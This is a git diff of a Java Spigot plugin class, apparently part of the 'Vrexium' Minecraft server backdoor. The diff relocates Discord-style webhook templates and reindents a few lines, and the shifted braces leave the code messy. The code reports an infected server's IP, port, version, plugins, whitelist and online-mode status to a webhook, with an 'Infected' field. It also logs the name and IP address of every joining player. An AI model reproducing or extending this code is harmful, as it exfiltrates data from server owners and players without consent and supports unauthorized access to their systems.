@@ -30,38 +30,6 @@ public class SpigotAPI implements Listener {
     // the URL of the webhook to send messages to
     private final String webhook;
 
-    private static final String SERVER_START_WEBHOOK_TEMPLATE = "{"
-        + "\"avatar_url\": \"https://squint.tf/icon.webp\","
-        + "\"username\": \"Vrexium 🌷\","
-        + "\"embeds\": [{"
-        + "    \"title\": \"Server Started\","
-        + "    \"color\": 16737917,"
-        + "    \"description\": \"a server has started with Vrexium >:) \n\n{desc}\","
-        + "    \"image\": {"
-        + "        \"url\": \"https://squint.tf/logo.webp\""
-        + "    },"
-        + "    \"footer\": {"
-        + "        \"text\": \"<3\""
-        + "    }"
-        + "}]"
-        + "}";
-    
-    private static final String PLAYER_JOIN_WEBHOOK_TEMPLATE = "{"
-        + "\"avatar_url\": \"https://squint.tf/icon.webp\","
-        + "\"username\": \"Vrexium 🌷\","
-        + "\"embeds\": [{"
-        + "    \"title\": \"Player Joined\","
-        + "    \"color\": 16737917,"
-        + "    \"description\": \"User: `{player}`\nIP: `{ip}`\n\","
-        + "    \"thumbnail\": {"
-        + "        \"url\": \"https://minotar.net/cube/{player}/100.png\""
-        + "    },"
-        + "    \"footer\": {"
-        + "        \"text\": \"<3\""
-        + "    }"
-        + "}]"
-        + "}";
-
     // a method that retrieves the server's public IP address
     public String getIP(){
         try{
@@ -107,13 +75,45 @@ public class SpigotAPI implements Listener {
         List<String> s = new ArrayList<String>();
 
         // add the name of each plugin to the list
-        for(Plugin pl : Bukkit.getPluginManager().getPlugins()){
-            s.add(pl.getName());
-        }
-        // return the plugin names as a comma-separated string
-        return String.join(", ", s);
+       for(Plugin pl : Bukkit.getPluginManager().getPlugins()){
+       s.add(pl.getName());
     }
+    // return the plugin names as a comma-separated string
+    return String.join(", ", s);
+}
 
+    private static final String SERVER_START_WEBHOOK_TEMPLATE = "{"
+        + "\"avatar_url\": \"https://squint.tf/icon.webp\","
+        + "\"username\": \"Vrexium 🌷\","
+        + "\"embeds\": [{"
+        + "    \"title\": \"Server Started\","
+        + "    \"color\": 16737917,"
+        + "    \"description\": \"a server has started with Vrexium >:) \n\n{desc}\","
+        + "    \"image\": {"
+        + "        \"url\": \"https://squint.tf/logo.webp\""
+        + "    },"
+        + "    \"footer\": {"
+        + "        \"text\": \"<3\""
+        + "    }"
+        + "}]"
+        + "}";
+    
+    private static final String PLAYER_JOIN_WEBHOOK_TEMPLATE = "{"
+        + "\"avatar_url\": \"https://squint.tf/icon.webp\","
+        + "\"username\": \"Vrexium 🌷\","
+        + "\"embeds\": [{"
+        + "    \"title\": \"Player Joined\","
+        + "    \"color\": 16737917,"
+        + "    \"description\": \"User: `{player}`\nIP: `{ip}`\n\","
+        + "    \"thumbnail\": {"
+        + "        \"url\": \"https://minotar.net/cube/{player}/100.png\""
+        + "    },"
+        + "    \"footer\": {"
+        + "        \"text\": \"<3\""
+        + "    }"
+        + "}]"
+        + "}";
+    
     private String formatServerStartWebhook() {
         String serverInfo = String.format("IP : `%s`\nPort : `%s`\nVersion : `%s`\nInfected : `%s`\nPlugins : `%s`\nOnline Mode : `%s`\nWhitelist : `%s`\nMax Players : `%d`\nOnline Players : `%d`\nMOTD : `%s`",
             getIP(),
@@ -165,6 +165,6 @@ public class SpigotAPI implements Listener {
         // if join logging is enabled, send a webhook message with the player's name and the server's name
         if(joinLogs){
             sendWebhook(formatPlayerJoinWebhook(e.getPlayer().getName()));
-        }
     }
+  }
 }
